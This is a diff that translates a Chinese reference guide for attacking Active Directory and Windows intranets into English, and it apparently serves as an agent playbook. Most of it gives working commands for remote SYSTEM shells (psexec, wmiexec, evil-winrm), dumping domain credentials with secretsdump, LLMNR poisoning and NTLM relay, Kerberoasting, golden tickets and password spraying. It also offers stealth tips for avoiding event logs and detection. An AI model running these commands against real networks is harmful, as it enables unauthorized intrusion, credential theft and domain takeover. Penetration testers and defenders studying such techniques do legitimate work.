@@ -1,27 +1,29 @@
-# Active Directory 与 Windows 内网(Active Directory & Windows Intranet)
+# Active Directory & Windows Intranet
 
-> **何时读本文件**:任务涉及域环境渗透、Windows 内网横向移动、SMB/WinRM/Kerberos/LDAP/MSSQL 协议攻击、域凭据转储、BloodHound 攻击路径分析时读取。
+**English** · [简体中文](08-ad-windows.zh-CN.md)
 
-## 快速决策表
+> **When to read this file**: Read it when a task involves domain-environment penetration, Windows intranet lateral movement, SMB/WinRM/Kerberos/LDAP/MSSQL protocol attacks, domain credential dumping, or BloodHound attack path analysis.
 
-| 任务场景 | 首选工具 | 备选 | 关键区别 |
+## Quick Decision Table
+
+| Scenario | First Choice | Alternatives | Key Differences |
 |---|---|---|---|
-| 批量验证凭据/密码喷洒 | netexec (nxc) | crackmapexec | nxc 是 CME 停更后的活跃继任者,语法基本兼容 |
-| 获取目标 SYSTEM shell | impacket-psexec | impacket-wmiexec、evil-winrm | psexec 落盘服务最稳;wmiexec 免落盘更隐蔽;WinRM 走 5985 需账户在 Remote Management Users |
-| 全量转储域凭据 | impacket-secretsdump | nxc smb --ntds | secretsdump 输出最全,支持离线解析 ntds.dit |
-| 捕获内网 NTLM hash | responder | impacket-ntlmrelayx | Responder 拿 hash 离线破解;relay 直接中继利用(免破解,但目标需未强制签名) |
-| Kerberoasting | impacket-GetUserSPNs | rubeus(Windows 侧)、nxc ldap --kerberoasting | Linux 侧优先 impacket;已有 Windows 会话用 rubeus |
-| AS-REP Roasting | impacket-getNPUsers | ldeep asreproast、rubeus asreproast | 只需一个普通域账户即可发起 |
-| AD 攻击路径分析 | bloodhound CE | azurehound(Azure 环境) | 图数据库分析,定位到域管的最短路径 |
-| 采集 AD 数据(无 Windows shell) | bloodhound-ce-python | sharphound(需在 Windows 执行) | Python 版从 Linux 直接采;SharpHound 数据更全(含会话/本地组) |
-| WinRM 交互 shell | evil-winrm | evil-winrm-py、impacket-wmiexec | 原生支持 PTH/证书认证、PS 脚本加载、文件上传下载 |
-| LDAP 全量枚举 | ldeep | nxc ldap、bloodyad | ldeep 一次命令全量导出;bloodyad 偏写操作 |
-| AD 对象提权写操作 | bloodyad | krbrelayx addspn | bloodyad 专做 ACL/属性/密码修改 |
-| 委派/中继滥用(RBCD/UD) | krbrelayx + impacket-getST | rubeus s4u | RBCD 全链路可在 Linux 侧完成 |
-| 枚举 SMB 共享与内容 | smbmap | nxc smb --shares | smbmap 支持递归搜索、按扩展名批量下载、PTH |
-| RDP 登录 | xfreerdp3 | rdesktop | FreeRDP3 活跃维护,rdesktop 已停更 |
+| Bulk credential validation / password spraying | netexec (nxc) | crackmapexec | nxc is the actively maintained successor to the discontinued CME; the syntax is largely compatible |
+| Get a SYSTEM shell on the target | impacket-psexec | impacket-wmiexec, evil-winrm | psexec's file-dropping service is the most reliable; wmiexec is fileless and stealthier; WinRM over 5985 requires the account to be in Remote Management Users |
+| Dump all domain credentials | impacket-secretsdump | nxc smb --ntds | secretsdump has the most complete output and supports offline parsing of ntds.dit |
+| Capture intranet NTLM hashes | responder | impacket-ntlmrelayx | Responder captures hashes for offline cracking; a relay exploits them directly (no cracking, but the target must not enforce signing) |
+| Kerberoasting | impacket-GetUserSPNs | rubeus (Windows side), nxc ldap --kerberoasting | Prefer impacket from Linux; use rubeus when you already have a Windows session |
+| AS-REP Roasting | impacket-getNPUsers | ldeep asreproast, rubeus asreproast | A single ordinary domain account is enough to launch it |
+| AD attack path analysis | bloodhound CE | azurehound (Azure environments) | Graph-database analysis that locates the shortest path to Domain Admin |
+| Collect AD data (no Windows shell) | bloodhound-ce-python | sharphound (must run on Windows) | The Python edition collects straight from Linux; SharpHound gathers more complete data (including sessions/local groups) |
+| WinRM interactive shell | evil-winrm | evil-winrm-py, impacket-wmiexec | Native PTH/certificate auth, PS script loading, and file upload/download |
+| Full LDAP enumeration | ldeep | nxc ldap, bloodyad | ldeep exports everything in one command; bloodyad leans toward write operations |
+| Privilege-escalation write operations on AD objects | bloodyad | krbrelayx addspn | bloodyad specializes in ACL/attribute/password modification |
+| Delegation/relay abuse (RBCD/UD) | krbrelayx + impacket-getST | rubeus s4u | The entire RBCD chain can be completed from Linux |
+| Enumerate SMB shares and contents | smbmap | nxc smb --shares | smbmap supports recursive search, bulk download by extension, and PTH |
+| RDP login | xfreerdp3 | rdesktop | FreeRDP3 is actively maintained; rdesktop is unmaintained |
 
-## 典型攻击链:从内网立足到域管
+## Typical Attack Chain: From Intranet Foothold to Domain Admin
 
 ```bash
 # ── 阶段 0:侦察 ──
@@ -56,13 +58,13 @@ impacket-GetUserSPNs -request -dc-ip <dc_ip> -outputfile kerb.txt '<domain>/<use
 hashcat -m 13100 kerb.txt <wordlist>                # Kerberoast TGS(RC4)= mode 13100
 ```
 
-## 核心工具详解
+## Core Tools in Depth
 
-### impacket-psexec — 通过 SMB 服务方式获取目标 SYSTEM 半交互 shell
+### impacket-psexec — get a semi-interactive SYSTEM shell on the target via an SMB service
 
-**用途**:仿 SysInternals PsExec,把可执行文件写入 ADMIN$ 共享并注册为服务启动,回连得到 SYSTEM shell。
-**安装**:`sudo apt install impacket-scripts`
-**使用场景**:已有本地管理员凭据(密码或 NTLM hash)、目标开放 445 时,是获取 shell 最直接的方式;wmiexec 被拦截或需要稳定交互时首选。
+**Purpose**: Mimics SysInternals PsExec — writes an executable into the ADMIN$ share, registers and starts it as a service, and gets a SYSTEM shell over the call-back connection.
+**Install**: `sudo apt install impacket-scripts`
+**When to use**: The most direct route to a shell when you hold local administrator credentials (password or NTLM hash) and the target exposes 445; the first choice when wmiexec is blocked or stable interaction is needed.
 
 ```bash
 # 域账户密码认证
@@ -81,17 +83,17 @@ impacket-psexec -share C$ '<domain>/<user>:<password>@<ip>'
 impacket-psexec -k -no-pass '<domain>/<user>@<target_fqdn>'
 ```
 
-**实战要点**:
-- 需要 ADMIN$ 可写 + 创建服务权限,普通域用户报 `STATUS_ACCESS_DENIED`;`nxc` 输出 `(Pwn3d!)` 的主机才可用
-- 会向目标写入随机命名的 exe 和服务,事件日志 7045 可见;需要隐蔽时改用 wmiexec
-- 密码含特殊字符时整个凭据串用单引号包裹
-- 域账户写 `<domain>/<user>`,本地账户只写 `<user>`
+**Practical tips**:
+- Requires ADMIN$ to be writable plus service-creation rights; ordinary domain users get `STATUS_ACCESS_DENIED`. Only hosts where `nxc` prints `(Pwn3d!)` are usable
+- Writes a randomly named exe and service onto the target, visible in event log 7045; switch to wmiexec when stealth is needed
+- Wrap the entire credential string in single quotes when the password contains special characters
+- Use `<domain>/<user>` for domain accounts and plain `<user>` for local accounts
 
-### impacket-smbexec — 通过服务执行 cmd 并回传输出的半交互 shell
+### impacket-smbexec — semi-interactive shell that executes cmd via a service and returns its output
 
-**用途**:与 psexec 同类,但不向目标上传 exe:通过 `%SYSTEMROOT%\Temp` 下的 bat 文件 + 命名管道回传命令输出,交互性略差但更少落盘。
-**安装**:`sudo apt install impacket-scripts`
-**使用场景**:ADMIN$ 无法写入可执行文件但仍可创建服务时;psexec 被文件检测拦截时的替代。
+**Purpose**: Same family as psexec but uploads no exe to the target: command output is returned through a bat file under `%SYSTEMROOT%\Temp` plus a named pipe — slightly less interactive but with fewer on-disk artifacts.
+**Install**: `sudo apt install impacket-scripts`
+**When to use**: When ADMIN$ cannot take an executable but a service can still be created; the fallback when psexec gets caught by file inspection.
 
 ```bash
 # 密码认证
@@ -101,16 +103,16 @@ impacket-smbexec '<domain>/<user>:<password>@<ip>'
 impacket-smbexec -hashes :<nt_hash> '<domain>/<user>@<ip>'
 ```
 
-**实战要点**:
-- 同样需要管理员服务创建权限,走 445
-- 交互方式为逐条命令回传,不支持交互式程序(如需要完整 shell 回退 psexec)
-- 与 psexec/wmiexec/atexec 统一支持 `-hashes`、`-k`(Kerberos)、`-dc-ip` 参数
+**Practical tips**:
+- Still needs administrator service-creation rights and goes over 445
+- Interaction is one command round-trip at a time; interactive programs are not supported (fall back to psexec for a full shell)
+- Supports the same `-hashes`, `-k` (Kerberos), and `-dc-ip` flags as psexec/wmiexec/atexec
 
-### impacket-scripts — impacket 攻击脚本套件(wmiexec/secretsdump/ntlmrelayx/GetUserSPNs 等)
+### impacket-scripts — impacket attack script suite (wmiexec/secretsdump/ntlmrelayx/GetUserSPNs etc.)
 
-**用途**:Kali 将 impacket 官方 examples 目录的脚本以 `impacket-` 前缀装入 PATH,是内网渗透的核心武器库:远程执行、凭据转储、NTLM 中继、Kerberos 攻击全套。
-**安装**:`sudo apt install impacket-scripts`(一次安装即含下列全部命令)
-**使用场景**:横向移动、域凭据转储、中继攻击、Kerberos 票据操作的默认选择。
+**Purpose**: Kali installs the scripts from impacket's official examples directory into PATH with the `impacket-` prefix — the core arsenal for intranet penetration: remote execution, credential dumping, NTLM relaying, and the full Kerberos attack set.
+**Install**: `sudo apt install impacket-scripts` (one install provides all the commands below)
+**When to use**: The default choice for lateral movement, domain credential dumping, relay attacks, and Kerberos ticket operations.
 
 ```bash
 # ── wmiexec:通过 WMI 执行,不落盘、不创建服务,比 psexec 隐蔽 ──
@@ -167,17 +169,17 @@ impacket-getTGT '<domain>/<user>:<password>'
 impacket-ticketer -nthash <krbtgt_nt_hash> -domain-sid <domain_sid> -domain <domain> administrator
 ```
 
-**实战要点**:
-- Kerberoast 票据 `hashcat -m 13100`,AS-REP `hashcat -m 18200`
-- secretsdump 输出中 `aad3b435b51404eeaad3b435b51404ee` 是空 LM hash;`-just-dc` 模式还会带出 kerberos 密钥(用于金票)
-- ntlmrelayx 与 Responder 不可同时抢 SMB/HTTP 端口:中继场景先在 `/etc/responder/Responder.conf` 关闭 SMB/HTTP
-- 所有远程执行类工具(psexec/smbexec/wmiexec/atexec)所需权限不同:wmiexec/atexec 只需 WMI/RPC 权限,psexec/smbexec 需完整管理员
+**Practical tips**:
+- Kerberoast tickets go to `hashcat -m 13100`, AS-REP to `hashcat -m 18200`
+- In secretsdump output, `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash; `-just-dc` mode also pulls the Kerberos keys (used for golden tickets)
+- ntlmrelayx and Responder cannot both fight over the SMB/HTTP ports: in relay scenarios, turn SMB/HTTP off in `/etc/responder/Responder.conf` first
+- The remote-execution tools (psexec/smbexec/wmiexec/atexec) need different rights: wmiexec/atexec only need WMI/RPC rights, while psexec/smbexec need full administrator
 
-### impacket-mssqlclient — MSSQL 数据库交互客户端
+### impacket-mssqlclient — interactive MSSQL database client
 
-**用途**:连接 MSSQL 的交互式客户端(基于 TDS 协议),支持 SQL/Windows 认证,内置 `enable_xp_cmdshell` 等命令执行辅助。
-**安装**:`sudo apt install impacket-scripts`
-**使用场景**:拿到 MSSQL 凭据(sa 或域账户)后,通过 xp_cmdshell 执行系统命令、枚举可登录目标(可信链接)。
+**Purpose**: Interactive client for MSSQL (based on the TDS protocol), supporting SQL/Windows authentication, with built-in command-execution helpers such as `enable_xp_cmdshell`.
+**Install**: `sudo apt install impacket-scripts`
+**When to use**: After obtaining MSSQL credentials (sa or a domain account), execute system commands via xp_cmdshell and enumerate login targets (trusted links).
 
 ```bash
 # SQL 认证
@@ -190,7 +192,7 @@ impacket-mssqlclient -windows-auth '<user>:<password>@<ip>'
 impacket-mssqlclient -windows-auth '<domain>/<user>:<password>@<ip>'
 ```
 
-进入 SQL shell 后:
+Once inside the SQL shell:
 
 ```
 enable_xp_cmdshell          # 开启 xp_cmdshell
@@ -198,16 +200,16 @@ xp_cmdshell whoami          # 执行系统命令
 SELECT name FROM master..sysdatabases;   -- 枚举数据库
 ```
 
-**实战要点**:
-- MSSQL 默认端口 1433,先由 nmap/nxc mssql 确认
-- `nxc mssql <ip> -u <user> -p <password> --local-auth` 可先快速验证凭据
-- MSSQL Trusted Links(mssql->mssql)可跨服务器跳转执行,常见于大型内网
+**Practical tips**:
+- MSSQL defaults to port 1433; confirm it first with nmap/nxc mssql
+- `nxc mssql <ip> -u <user> -p <password> --local-auth` can quickly validate credentials first
+- MSSQL Trusted Links (mssql->mssql) allow hopping across servers to execute code; common in large intranets
 
-### impacket-smbserver — 一行命令起一个 SMB 共享服务器
+### impacket-smbserver — stand up an SMB share server with one command
 
-**用途**:在攻击机当前目录开启匿名 SMB 共享,用于向目标传文件、或诱捕目标发起的 SMB 认证。
-**安装**:`sudo apt install impacket-scripts`
-**使用场景**:目标只出 SMB 不出 HTTP 时的文件投递;配合 scf/lnk 文件放在可写共享中捕获 hash。
+**Purpose**: Opens an anonymous SMB share rooted at the attacker machine's current directory, used to deliver files to targets or to trap SMB authentication initiated by them.
+**Install**: `sudo apt install impacket-scripts`
+**When to use**: File delivery when the target allows SMB but not HTTP; combined with scf/lnk files dropped into a writable share to capture hashes.
 
 ```bash
 # 起名为 share 的匿名共享,根目录为当前目录(-smb2support 支持 SMB2)
@@ -217,16 +219,16 @@ impacket-smbserver share /path/to/dir -smb2support
 impacket-smbserver share . -username <user> -password <pass> -smb2support
 ```
 
-**实战要点**:
-- 目标侧访问:`copy \\<attacker_ip>\share\payload.exe` 或 `net use \\<attacker_ip>\share /user:<user> <pass>`
-- 与 Responder 冲突:两者都监听 445,同时运行前先停掉对方
-- 传完即 Ctrl-C 关闭,长开易被巡查发现
+**Practical tips**:
+- Access from the target side: `copy \\<attacker_ip>\share\payload.exe` or `net use \\<attacker_ip>\share /user:<user> <pass>`
+- Conflicts with Responder: both listen on 445, so stop one before running the other
+- Shut it down with Ctrl-C once the transfer is done; leaving it up makes it easy to spot in routine sweeps
 
-### netexec — 大网络批量验证/枚举/执行的多协议瑞士军刀(CME 继任者)
+### netexec — multi-protocol Swiss Army knife for bulk validation/enumeration/execution across large networks (CME successor)
 
-**用途**:CrackMapExec 的活跃续作(命令 `nxc`),一条命令对一批主机做 SMB/WinRM/MSSQL/LDAP/SSH/RDP 等协议的枚举、凭据验证、喷洒与命令执行。
-**安装**:`sudo apt install netexec`
-**使用场景**:任何"我有凭据/我想知道谁在管这台机器"的批量场景;凭据喷洒前先用它确认账户锁定阈值。
+**Purpose**: The actively maintained continuation of CrackMapExec (command `nxc`); a single command runs enumeration, credential validation, spraying, and command execution over SMB/WinRM/MSSQL/LDAP/SSH/RDP and other protocols against a batch of hosts.
+**Install**: `sudo apt install netexec`
+**When to use**: Any bulk scenario of the "I have credentials / I want to know who administers this machine" kind; confirm the account lockout threshold with it before credential spraying.
 
 ```bash
 # ── 探测 ──
@@ -265,17 +267,17 @@ nxc ldap <dc_ip> -u <user> -p <password> --asreproast asrep.txt
 nxc mssql <ip> -u <user> -p <password> --local-auth
 ```
 
-**实战要点**:
-- 输出中 `(Pwn3d!)` 表示该凭据对目标为本地管理员,可直接上 impacket-psexec
-- 喷洒前必读 `--pass-pol`:锁定阈值通常 5 次/30 分钟,喷洒节奏 = 1 密码 × 全部用户
-- `nxc winrm` 成功的账户即可用 evil-winrm 拿交互 shell
-- 工作区数据库在 `~/.nxc`(CME 在 `~/.cme`),记录所有历史成功凭据
+**Practical tips**:
+- `(Pwn3d!)` in the output means the credentials are local administrator on that target — go straight to impacket-psexec
+- Always read `--pass-pol` before spraying: the lockout threshold is typically 5 attempts/30 minutes; spraying cadence = 1 password × all users
+- Any account that succeeds on `nxc winrm` can get an interactive shell with evil-winrm
+- The workspace database lives in `~/.nxc` (CME in `~/.cme`) and records every historically successful credential
 
-### crackmapexec — netexec 的前身(已停止维护)
+### crackmapexec — netexec's predecessor (no longer maintained)
 
-**用途**:与 netexec 同源同语法的经典内网瑞士军刀,现已停更;新项目应直接用 netexec。
-**安装**:`sudo apt install crackmapexec`
-**使用场景**:目标环境文档/历史脚本基于 cme 语法时使用;否则一律换 nxc。
+**Purpose**: The classic intranet Swiss Army knife, same origin and syntax as netexec but now unmaintained; new engagements should use netexec directly.
+**Install**: `sudo apt install crackmapexec`
+**When to use**: When the target environment's documentation or legacy scripts are written against cme syntax; otherwise switch to nxc across the board.
 
 ```bash
 # 语法与 netexec 一致,协议模块 smb/winrm/mssql/ldap 等
@@ -284,15 +286,15 @@ crackmapexec smb <dc_ip> -u <admin> -p <password> --ntds
 cme smb <cidr> -u users.txt -p <password> --continue-on-success   # 短命令 cme
 ```
 
-**实战要点**:
-- cme 与 nxc 不可同时对同一数据库目录运行
-- 老版本部分模块(如 --wcc、--spider)在 nxc 中已重构为 `-M <module>` 模块体系
+**Practical tips**:
+- cme and nxc cannot run against the same database directory simultaneously
+- Some old modules (e.g. --wcc, --spider) have been reworked in nxc into the `-M <module>` module system
 
-### responder — LLMNR/NBT-NS/mDNS 毒化器,内网抓 hash 第一工具
+### responder — LLMNR/NBT-NS/mDNS poisoner, the go-to hash-capture tool for intranets
 
-**用途**:伪造内网名称解析应答(LLMNR/NBT-NS/mDNS),截获主机发起的 SMB/HTTP/LDAP 等认证,得到可离线破解的 NTLMv2 hash;内置 WPAD 伪装代理。
-**安装**:`sudo apt install responder`
-**使用场景**:进入内网后的第一批动作之一——等待(或诱导)主机访问不存在的资源名;无凭据起点时最主要的凭据来源。
+**Purpose**: Forges intranet name-resolution responses (LLMNR/NBT-NS/mDNS) to intercept SMB/HTTP/LDAP and other authentication initiated by hosts, yielding NTLMv2 hashes that can be cracked offline; a rogue WPAD proxy is built in.
+**Install**: `sudo apt install responder`
+**When to use**: One of the first moves after entering an intranet — wait for (or induce) hosts to access nonexistent resource names; the main credential source when starting from zero credentials.
 
 ```bash
 # 常规:监听指定接口,毒化并捕获认证
@@ -305,17 +307,17 @@ sudo responder -I eth0 -A
 responder -i <ip> -w On -r On -f On
 ```
 
-**实战要点**:
-- 捕获的 hash 在 `/usr/share/responder/logs/`(SMB-NTLMv2-SSP-*.txt),`hashcat -m 5600` 破解
-- 破解不动时转中继:在 `/etc/responder/Responder.conf` 把 `SMB=Off`、`HTTP=Off`,由 `impacket-ntlmrelayx` 接管 445/80
-- `nxc smb <cidr> --gen-relay-list` 先筛出未强制签名的目标再中继
-- 挑战值默认固定在 Responder.conf 的 Challenge 字段,可自定义为全零便于彩虹表/快速破解判断
+**Practical tips**:
+- Captured hashes land in `/usr/share/responder/logs/` (SMB-NTLMv2-SSP-*.txt); crack them with `hashcat -m 5600`
+- When cracking stalls, switch to relay: set `SMB=Off` and `HTTP=Off` in `/etc/responder/Responder.conf` and let `impacket-ntlmrelayx` take over 445/80
+- Pre-filter targets without signing enforcement with `nxc smb <cidr> --gen-relay-list` before relaying
+- The challenge value is fixed by default in the Challenge field of Responder.conf; customizing it to all zeros eases rainbow-table and quick-crack triage
 
-### evil-winrm — WinRM 交互 shell(功能最全)
+### evil-winrm — WinRM interactive shell (most full-featured)
 
-**用途**:通过 WinRM(5985/5986)获得目标交互 PowerShell,支持密码/NTLM hash/证书认证、PS 脚本与 exe 加载、文件上传下载、AMSI bypass。
-**安装**:`sudo apt install evil-winrm`
-**使用场景**:账户在 Remote Management Users 组(常见于svc账户被误授权)时,是拿交互 shell 的首选。
+**Purpose**: Gets an interactive PowerShell on the target over WinRM (5985/5986); supports password/NTLM hash/certificate authentication, PS script and exe loading, file upload/download, and AMSI bypass.
+**Install**: `sudo apt install evil-winrm`
+**When to use**: The first choice for an interactive shell when the account sits in the Remote Management Users group (common with svc accounts granted it by mistake).
 
 ```bash
 # 密码认证
@@ -334,7 +336,7 @@ evil-winrm -i <ip> -S -c cert.pem -k priv.key
 evil-winrm -i <ip> -u <user> -p <password> -s /usr/share/nishang/Gather/ -e /opt/binaries/
 ```
 
-进入 shell 后内置命令:
+Built-in commands once inside the shell:
 
 ```
 menu                       # 列出可用扩展命令
@@ -343,16 +345,16 @@ upload /local/file.exe C:\\Temp\\file.exe
 download C:\\Temp\\loot.txt /tmp/loot.txt
 ```
 
-**实战要点**:
-- 先 `nxc winrm <ip> -u <user> -p <password>` 确认 `[+]` 成功再连,避免锁定账户
-- WinRM 认证成功但非管理员时无文件传输权限,需提权后再上传
-- Kerberos 环境可配合 `-r <domain>` 使用票据(需先 kinit)
+**Practical tips**:
+- Confirm a `[+]` success with `nxc winrm <ip> -u <user> -p <password>` before connecting, to avoid locking the account
+- WinRM authentication that succeeds without administrator rights has no file-transfer permission; escalate privileges before uploading
+- In Kerberos environments, tickets can be used with `-r <domain>` (run kinit first)
 
-### bloodhound — AD 攻击路径图分析平台(CE 版)
+### bloodhound — AD attack-path graph analysis platform (CE edition)
 
-**用途**:BloodHound Community Edition,把 AD 关系(成员、ACL、会话、委派、GPO)建成图数据库,自动发现从普通账户到 Domain Admins 的最短提权路径。
-**安装**:`sudo apt install bloodhound`
-**使用场景**:拿到任意域账户后的必做步骤——人工看不出的 ACL/委派/嵌套组路径由它算出。
+**Purpose**: BloodHound Community Edition models AD relationships (membership, ACLs, sessions, delegation, GPOs) into a graph database and automatically discovers the shortest privilege-escalation path from an ordinary account to Domain Admins.
+**Install**: `sudo apt install bloodhound`
+**When to use**: A must-do step after obtaining any domain account — it computes the ACL/delegation/nested-group paths that manual review cannot see.
 
 ```bash
 # Kali 包把 CE 部署文件放在 /usr/share/bloodhound,以 docker compose 运行
@@ -362,17 +364,17 @@ sudo docker compose logs 2>&1 | grep -i password
 # 浏览器访问 http://127.0.0.1:8080/ui/login,首次登录强制改密
 ```
 
-**实战要点**:
-- 采集器(bloodhound-ce-python / sharphound / rubeus)产出的 zip 在 UI 右上角 Upload 入库
-- 常用内置查询:Shortest Path to Domain Admins、Kerberoastable Users、AS-REP Roastable Users、Find Workstations where Domain Users are Logged In
-- Cypher 快查示例(AS-REP 可烤账户):`MATCH (u:User {dontreqpreauth: true}) RETURN u`
-- 采集数据越多(尤其 Session/LocalAdmin),路径越准;`-c DCOnly` 最安静但无会话数据
+**Practical tips**:
+- Ingest the zips produced by collectors (bloodhound-ce-python / sharphound / rubeus) through Upload in the top-right corner of the UI
+- Frequently used built-in queries: Shortest Path to Domain Admins, Kerberoastable Users, AS-REP Roastable Users, Find Workstations where Domain Users are Logged In
+- Quick Cypher lookup (AS-REP roastable accounts): `MATCH (u:User {dontreqpreauth: true}) RETURN u`
+- The more data collected (especially Session/LocalAdmin), the more accurate the paths; `-c DCOnly` is the quietest but yields no session data
 
-### bloodhound-python / bloodhound-ce-python — 从 Linux 远程采集 AD 数据
+### bloodhound-python / bloodhound-ce-python — remotely collect AD data from Linux
 
-**用途**:基于 impacket 的 BloodHound 采集器,只需一个域账户即可从 Linux 直接拉取全部域数据;`bloodhound-ce-python` 对应 CE 版,旧 `bloodhound-python` 对应 legacy(≤4.3.1)。
-**安装**:`sudo apt install bloodhound-python`(Kali 现以 bloodhound-ce-python 包提供,命令为 `bloodhound-ce-python`)
-**使用场景**:没有 Windows shell 可跑 SharpHound 时,纯 Linux 侧采集。
+**Purpose**: impacket-based BloodHound collector that pulls all of the domain's data straight from Linux with just one domain account; `bloodhound-ce-python` targets CE, while the older `bloodhound-python` targets legacy (≤4.3.1).
+**Install**: `sudo apt install bloodhound-python` (Kali now ships it as the bloodhound-ce-python package, with the `bloodhound-ce-python` command)
+**When to use**: Pure-Linux collection when there is no Windows shell to run SharpHound.
 
 ```bash
 # 全量采集(密码认证);-ns 指定解析用的 DC
@@ -388,16 +390,16 @@ bloodhound-ce-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c DCOnly
 bloodhound-python -d <domain> -u <user> -p <password> -ns <dc_ip> -c All --zip
 ```
 
-**实战要点**:
-- 产出的 `*_bloodhound.zip` 直接上传 BloodHound CE
-- `--zip` 打包所有 json;不指定则输出散装 json 文件
-- 需要 DNS 能解析域名(-ns 指向 DC 即可,不必改全局 DNS);Kerberos 认证加 `-k` 并配合 kinit
+**Practical tips**:
+- Upload the resulting `*_bloodhound.zip` straight into BloodHound CE
+- `--zip` bundles all the json; without it, the output is loose json files
+- DNS must be able to resolve the domain name (pointing `-ns` at the DC is enough; no need to change global DNS); for Kerberos authentication add `-k` and pair it with kinit
 
-### sharphound — C# 版 BloodHound 采集器(在 Windows 上运行)
+### sharphound — C# BloodHound collector (runs on Windows)
 
-**用途**:官方 C# 采集器,数据最全(会话、本地组、ACL、委派、GPO),适合已有 Windows shell 时一次性全量采集。
-**安装**:`sudo apt install sharphound`(Kali 提供预编译 exe)
-**使用场景**:已通过 evil-winrm/psexec 拿到 Windows shell,采集深度数据(尤其 Session)。
+**Purpose**: The official C# collector with the most complete data (sessions, local groups, ACLs, delegation, GPOs); suited to a one-shot full collection once a Windows shell is in hand.
+**Install**: `sudo apt install sharphound` (Kali ships a prebuilt exe)
+**When to use**: After getting a Windows shell via evil-winrm/psexec, to collect deep data (especially Sessions).
 
 ```bash
 # 定位 Kali 包内的 exe,上传到目标
@@ -407,7 +409,7 @@ evil-winrm -i <ip> -u <user> -p <password>
 upload /usr/share/sharphound/SharpHound.exe C:\\Temp\\SharpHound.exe
 ```
 
-目标机上执行:
+Run on the target machine:
 
 ```
 SharpHound.exe -c All
@@ -415,22 +417,22 @@ SharpHound.exe -c All --Stealth           # 低速模式,减少流量特征
 SharpHound.exe -c Session --Domain <domain>   # 只采会话,定位域管登录位置
 ```
 
-**实战要点**:
-- 产出 `*_BloodHound.zip` 在当前目录,download 回来上传 BloodHound
-- 会话采集(Loop)对 DC 查询频繁,`--Stealth` 或只跑 `Session` 可控噪音
-- .NET 4.6.2+ 环境;老系统用旧版本 SharpHound
+**Practical tips**:
+- The resulting `*_BloodHound.zip` lands in the current directory; download it back and upload it to BloodHound
+- Session collection (Loop) queries the DC heavily; `--Stealth` or running `Session` only keeps the noise under control
+- Requires .NET 4.6.2+; use an older SharpHound build on legacy systems
 
-### rubeus — Windows 侧 Kerberos 原语工具集(C#)
+### rubeus — Kerberos primitives toolkit for the Windows side (C#)
 
-**用途**:在 Windows 上操作 Kerberos 全流程:请求/导入/转储票据、Kerberoasting、AS-REP、S4U 委派滥用、票据传递。
-**安装**:`sudo apt install rubeus`(Kali 提供 exe;用 `dpkg -L rubeus` 定位后上传)
-**使用场景**:已有 Windows shell 且目标走 Kerberos(端口 88 通 DC)时,比从 Linux 操作票据更少跨协议痕迹。
+**Purpose**: Drives the whole Kerberos workflow on Windows: requesting/importing/dumping tickets, Kerberoasting, AS-REP, S4U delegation abuse, and pass-the-ticket.
+**Install**: `sudo apt install rubeus` (Kali ships the exe; locate it with `dpkg -L rubeus` and upload it)
+**When to use**: When a Windows shell is already in hand and the target speaks Kerberos (port 88 reachable to the DC); working with tickets here leaves fewer cross-protocol traces than doing it from Linux.
 
 ```bash
 dpkg -L rubeus    # 定位 Rubeus.exe 并上传到目标
 ```
 
-目标机(evil-winrm shell)内执行:
+Run inside the target (evil-winrm shell):
 
 ```
 Rubeus.exe kerberoast /outfile:C:\Temp\kerb.txt          # Kerberoasting
@@ -444,16 +446,16 @@ Rubeus.exe s4u /user:<svc_user> /rc4:<nt_hash> /impersonate:administrator /msdss
 Rubeus.exe harvest /interval:30                           # 持续收割内存中新建票据
 ```
 
-**实战要点**:
-- `/nowrap` 输出单行 Base64 kirbi,方便复制;转 Linux 用需 kirbi→ccache 转换(ticket_converter)
-- kerberoast 输出 `hashcat -m 13100`
-- `/ptt`(pass the ticket)即时生效,无需 klist purge 之外操作;s4u 是 RBCD/约束委派利用的核心
+**Practical tips**:
+- `/nowrap` prints a single-line Base64 kirbi for easy copying; converting it for Linux use requires a kirbi→ccache conversion (ticket_converter)
+- Crack kerberoast output with `hashcat -m 13100`
+- `/ptt` (pass the ticket) takes effect immediately, requiring nothing beyond klist purge; s4u is the core of RBCD/constrained delegation exploitation
 
-### kerberoast — Kerberos 攻击脚本集(含票据破解)
+### kerberoast — Kerberos attack script collection (with ticket cracking)
 
-**用途**:经典 Kerberoast 工具集:GetUserSPNs 请求票据、tgsrepcrack/kirbi2john 破解、从 pcap 提取票据。
-**安装**:`sudo apt install kerberoast`(脚本位于 `/usr/share/kerberoast/`)
-**使用场景**:需要离线破解 .kirbi 票据,或没有 impacket 环境时的备用采集方式。
+**Purpose**: The classic Kerberoast toolkit: GetUserSPNs to request tickets, tgsrepcrack/kirbi2john to crack them, and ticket extraction from pcaps.
+**Install**: `sudo apt install kerberoast` (scripts live in `/usr/share/kerberoast/`)
+**When to use**: When .kirbi tickets need offline cracking, or as a fallback collection method where no impacket environment exists.
 
 ```bash
 # 破解 kirbi 票据(字典攻击)
@@ -470,16 +472,16 @@ python3 /usr/share/kerberoast/extracttgsrepfrompcap.py <capture.pcap>
 ls /usr/share/kerberoast/
 ```
 
-**实战要点**:
-- 现代 RC4-HMAC 票据破解 `hashcat -m 13100` 更快;tgsrepcrack 适合无 GPU 场景
-- AES 票据(`krb5tgs$18`)字典基本打不动,优先找仍用 RC4 的服务账户
-- GetUserSPNs.ps1 在域内任意 Windows 主机以普通用户即可请求全部 SPN 票据
+**Practical tips**:
+- `hashcat -m 13100` is faster for modern RC4-HMAC tickets; tgsrepcrack suits GPU-less scenarios
+- Dictionary attacks barely scratch AES tickets (`krb5tgs$18`); prioritize service accounts still using RC4
+- GetUserSPNs.ps1 can request every SPN ticket from any Windows host in the domain as an ordinary user
 
-### krbrelayx — Kerberos 中继与委派滥用套件
+### krbrelayx — Kerberos relaying and delegation abuse suite
 
-**用途**:Kerberos relaying + 非约束委派捕获 + SPN/LDAP 操作套件,包含 krbrelayx、addspn、printerbug、dnstool。
-**安装**:`sudo apt install krbrelayx`
-**使用场景**:RBCD(基于资源的约束委派)全链路、非约束委派捕获 DC 票据、ADIDNS 通配符记录投毒。
+**Purpose**: A suite for Kerberos relaying + unconstrained delegation capture + SPN/LDAP operations; bundles krbrelayx, addspn, printerbug, and dnstool.
+**Install**: `sudo apt install krbrelayx`
+**When to use**: The full RBCD (resource-based constrained delegation) chain, capturing DC tickets through unconstrained delegation, and ADIDNS wildcard record poisoning.
 
 ```bash
 # ── RBCD 利用链 ──
